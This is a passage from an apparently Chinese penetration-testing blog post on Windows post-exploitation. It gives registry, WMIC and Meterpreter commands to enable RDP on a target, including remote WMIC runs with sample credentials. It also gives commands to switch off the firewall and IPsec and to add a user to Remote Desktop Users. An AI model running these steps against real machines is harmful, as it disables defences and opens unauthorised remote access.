+<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p>远程转发 一般用于外网无法访问内网，内网可以访问外网，由内部发出请求到外网，所以防火墙不会拦截。客户端除了可以在本地访问内网机子，也可以作为中间人，外部机子也能连接客户端到内网服务端</p>
+<h2 id="相关远程终端问题"><a href="#相关远程终端问题" class="headerlink" title="相关远程终端问题"></a>相关远程终端问题</h2><h3 id="注册表开启-3389"><a href="#注册表开启-3389" class="headerlink" title="注册表开启 3389"></a>注册表开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo DO ALL IN CMD!</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v</span><br><span class="line">fDenyTSConnections /t REG_DWORD /d 0 /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\Wds\rdpwd\Tds\tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 3389 /f</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF-命令开启-3389"><a href="#MSF-命令开启-3389" class="headerlink" title="MSF 命令开启 3389"></a>MSF 命令开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e</span><br></pre></td></tr></table></figure>
+
+<h3 id="一条命令开启-3389"><a href="#一条命令开启-3389" class="headerlink" title="一条命令开启 3389"></a>一条命令开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v</span><br><span class="line">fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<h3 id="WMIC-命令开启-3389"><a href="#WMIC-命令开启-3389" class="headerlink" title="WMIC 命令开启 3389"></a>WMIC 命令开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#前提条件是确保“Windows Management Instrumentation(Winmgmt)”服务已正常启动</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+
+<h3 id="WMIC-开启-3389"><a href="#WMIC-开启-3389" class="headerlink" title="WMIC 开启 3389"></a>WMIC 开启 3389</h3><p>支持系统：Win2k&#x2F;XP&#x2F;Win2k3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.103 /user:administrator /password:betasec PATH win32_terminalservicesetting WHERE (__Class!=&quot;&quot;) CALL SetAllowTSConnections 1</span><br></pre></td></tr></table></figure>
+
+<p>支持系统：Win7&#x2F;Win2k8&#x2F;Win8.1&#x2F;Win10&#x2F;2012&#x2F;2016</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.0.116 /user:administrator /password:betasec RDTOGGLE WHERE</span><br><span class="line">ServerName=&#x27;WIN-TO2CN3V2VPR&#x27; call SetAllowTSConnections 1</span><br><span class="line">wmic /node:192.168.0.116 /user:administrator /password:betasec process call</span><br><span class="line">create &#x27;cmd.exe /c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal</span><br><span class="line">Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注意：其实就是利用 WMIC 远程执行命令的方式来执行 WMIC、REG 等开启 3389 端口的命令。WMIC 远程开启 3389 端口时不能用 % COMPUTERNAME% 环境变量替代远程主机的计算机名。错误：描述 &#x3D; 拒绝访问，这是因为开启了 UAC 用户账户控制，只允许 RID500 管理员执行此操作</p>
+<h3 id="查询是否开启-3389"><a href="#查询是否开启-3389" class="headerlink" title="查询是否开启 3389"></a>查询是否开启 3389</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br></pre></td></tr></table></figure>
+
+<h3 id="注册表查询端口号"><a href="#注册表查询端口号" class="headerlink" title="注册表查询端口号"></a>注册表查询端口号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\</span><br><span class="line"></span><br><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds&quot; /s</span><br><span class="line"></span><br><span class="line">REG query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDPTcp&quot; /v PortNumber set /a Port=0xd3d</span><br></pre></td></tr></table></figure>
+
+<h3 id="网络命令查询端口"><a href="#网络命令查询端口" class="headerlink" title="网络命令查询端口"></a>网络命令查询端口</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr &quot;TermService&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano | findstr &quot;进程号&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net start |find &quot;Remote Desktop Services&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>确定开启了远程终端并且端口没错的情况下 还是连不上目标，目标上的防火墙可能允许，这个时候可以使用 lcx 端口转发，或者使用命令关闭防火墙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show allprofile state #查询防火墙状态</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off #关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop &quot;Windows Firewall&quot; #关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc config sharedaccess start= disabled  #关闭防火墙</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop sharedaccess #关闭防火墙</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="关闭-IPSEC"><a href="#关闭-IPSEC" class="headerlink" title="关闭 IPSEC"></a>关闭 IPSEC</h3><p>在关闭防火墙时，还是连接不上，可能是 ipsec 做了 ip 策略处理，导致连接失败可以使用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net stop &quot;IPsec Policy Agent&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3389-连接错误解决方法"><a href="#3389-连接错误解决方法" class="headerlink" title="3389 连接错误解决方法"></a>3389 连接错误解决方法</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634604853/Xnip2021-10-19_08-50-30_fib8ti.png"></p>
+<p>可以使用相同版本的终端进行连接 或者使用 xfreerdp 连接会自动加密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install freerdp2-x11 #安装</span><br><span class="line">xfreerdp /f /u:administrator /p:123456 /v:192.168.0.118 #使用语法</span><br></pre></td></tr></table></figure>
+
+<h3 id="加入远程桌面组"><a href="#加入远程桌面组" class="headerlink" title="加入远程桌面组"></a>加入远程桌面组</h3><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1634604858/Xnip2021-10-19_08-51-56_rgombo.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup &quot;Remote Desktop Users&quot; username /add</span><br></pre></td></tr></table></figure>
+
+<h3 id="终端超出最大连接数"><a href="#终端超出最大连接数" class="headerlink" title="终端超出最大连接数"></a>终端超出最大连接数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mstsc /v:ip:3389 /console #使用此命令连接即可</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/vlog/">vlog</a></li>
+         
+          <li><a href="/gallery/">Photo</a></li>
+         
+          <li><a href="/friends/">Friends</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">windows 基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8E%E7%BB%84"><span class="toc-number">1.1.</span> <span class="toc-text">用户与组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7"><span class="toc-number">1.2.</span> <span class="toc-text">常见内置用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">1.3.</span> <span class="toc-text">内置用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.</span> <span class="toc-text">windows 常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-sid-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.5.</span> <span class="toc-text">windows sid 简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.</span> <span class="toc-text">windows 权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.</span> <span class="toc-text">提权常用方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">提权常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-number">2.3.</span> <span class="toc-text">windows 漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E6%8F%90%E6%9D%83%E8%BE%85%E5%8A%A9"><span class="toc-number">2.4.</span> <span class="toc-text">windows 提权辅助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95%E6%88%96%E8%80%85%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">查询可写目录或者文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-1675-Windows-Print-Spooler-%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">CVE-2021-1675 Windows Print Spooler 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-3225%EF%BC%88MS16-075%EF%BC%89-%E7%83%82%E5%9C%9F%E8%B1%86-%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">CVE-2016-3225（MS16-075） 烂土豆 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">4.3.</span> <span class="toc-text">洞影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-exp-%E4%B8%8B%E8%BD%BD"><span class="toc-number">4.4.</span> <span class="toc-text">漏洞 exp 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.5.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2014-4113-MS14-058-%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">CVE-2014-4113 (MS14-058) 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">5.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">5.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">5.4.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-0787-%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">CVE-2020-0787 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">6.1.</span> <span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">6.2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E-exp-%E4%B8%8B%E8%BD%BD-1"><span class="toc-number">6.3.</span> <span class="toc-text">漏洞 exp 下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">6.4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">6.5.</span> <span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">msf 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-number">7.1.</span> <span class="toc-text">描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">7.2.</span> <span class="toc-text">权限提升</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%A8%A1%E5%9D%97"><span class="toc-number">7.3.</span> <span class="toc-text">windows 常见的权限提升模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf-%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">7.4.</span> <span class="toc-text">msf 基础命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81%E6%83%85%E5%86%B5"><span class="toc-number">7.5.</span> <span class="toc-text">查询系统补丁情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">7.6.</span> <span class="toc-text">权限维持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92-shell-%E4%B8%8E%E9%9D%9E%E4%BA%A4%E4%BA%92-shell"><span class="toc-number">8.</span> <span class="toc-text">交互 shell 与非交互 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92-shell"><span class="toc-number">8.1.</span> <span class="toc-text">交互 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E4%BA%A4%E4%BA%92-shell"><span class="toc-number">8.2.</span> <span class="toc-text">非交互 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc-%E5%8F%8D%E5%BC%B9-shell-%E6%8F%90%E6%9D%83"><span class="toc-number">8.3.</span> <span class="toc-text">nc 反弹 shell 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell-%E5%8F%8D%E5%BC%B9-shell-%E6%8F%90%E6%9D%83"><span class="toc-number">8.4.</span> <span class="toc-text">powershell 反弹 shell 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nishang-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">8.5.</span> <span class="toc-text">nishang 反弹 shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows-%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text">windows 系统配置错误提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF"><span class="toc-number">9.1.</span> <span class="toc-text">系统服务配置错误</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">9.1.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">9.1.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%8F%90%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">不带引号的服务路径提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">9.2.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">9.2.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E9%94%AE-AlwaysInstallElevated"><span class="toc-number">9.3.</span> <span class="toc-text">注册键 AlwaysInstallElevated</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">9.3.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="toc-number">9.3.2.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="toc-number">9.3.3.</span> <span class="toc-text">漏洞修复</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">9.4.</span> <span class="toc-text">自动安装配置文件提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-1"><span class="toc-number">9.4.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="toc-number">9.4.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0-dll-%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text">本地 dll 劫持提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-2"><span class="toc-number">10.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="toc-number">10.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">第三方服务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-SERVER-%E6%8F%90%E6%9D%83"><span class="toc-number">11.1.</span> <span class="toc-text">SQL SERVER 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-2"><span class="toc-number">11.1.1.</span> <span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8"><span class="toc-number">11.1.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.</span> <span class="toc-text">mysql 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#udf-%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.1.</span> <span class="toc-text">udf 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-3"><span class="toc-number">11.2.2.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9"><span class="toc-number">11.2.3.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mysql-%E6%8F%90%E6%9D%83%E9%97%AE%E9%A2%98"><span class="toc-number">11.2.4.</span> <span class="toc-text">mysql 提权问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mof-%E6%8F%90%E6%9D%83"><span class="toc-number">11.2.5.</span> <span class="toc-text">mof 提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-4"><span class="toc-number">11.2.6.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-1"><span class="toc-number">11.2.7.</span> <span class="toc-text">漏洞影响版本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#G6FTP-%E6%8F%90%E6%9D%83"><span class="toc-number">11.3.</span> <span class="toc-text">G6FTP 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">11.3.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">11.3.2.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10"><span class="toc-number">11.3.3.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uac-bypass"><span class="toc-number">12.</span> <span class="toc-text">uac bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-5"><span class="toc-number">12.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11"><span class="toc-number">12.2.</span> <span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LCX-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">13.</span> <span class="toc-text">LCX 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%AE%80%E4%BB%8B"><span class="toc-number">13.1.</span> <span class="toc-text">工具简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">13.2.</span> <span class="toc-text">常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91"><span class="toc-number">13.3.</span> <span class="toc-text">本地转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91"><span class="toc-number">13.4.</span> <span class="toc-text">远程转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E9%97%AE%E9%A2%98"><span class="toc-number">14.</span> <span class="toc-text">相关远程终端问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.1.</span> <span class="toc-text">注册表开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF-%E5%91%BD%E4%BB%A4%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.2.</span> <span class="toc-text">MSF 命令开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%9D%A1%E5%91%BD%E4%BB%A4%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.3.</span> <span class="toc-text">一条命令开启 3389</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMIC-%E5%91%BD%E4%BB%A4%E5%BC%80%E5%90%AF-3389"><span class="toc-number">14.4.</span> <span class="toc-text">WMIC 命令开启 3389</span></a></li><li class="toc-item 